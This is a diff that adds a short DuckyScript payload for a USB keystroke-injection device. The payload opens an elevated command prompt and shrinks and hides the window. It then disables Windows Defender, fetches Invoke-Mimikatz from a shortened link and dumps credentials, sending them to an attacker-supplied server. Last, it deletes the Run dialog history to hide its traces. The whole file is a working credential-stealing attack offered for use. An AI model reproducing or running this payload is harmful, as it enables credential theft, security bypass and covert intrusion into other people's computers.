@@ -1,0 +1,18 @@
+GUI r
+DELAY 500
+STRING powershell Start-Process cmd -Verb runAs
+ENTER
+DELAY 2000
+ALT y
+DELAY 1000
+STRING mode con:cols=18 lines=1
+ENTER
+STRING color FE
+ENTER
+STRING powershell "Set-MpPreference -DisableRealtimeMonitoring $true;IEX (New-Object Net.WebClient).DownloadString('https://bit.ly/2VwLpOn'); $a = Invoke-Mimikatz -DumpCreds; (New-Object Net.WebClient).UploadString('https://<yourserver>.com/index.php', $a)"
+ENTER
+DELAY 2000
+STRING powershell "Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU' -Name '*' -ErrorAction SilentlyContinue"
+ENTER
+STRING exit
+ENTER
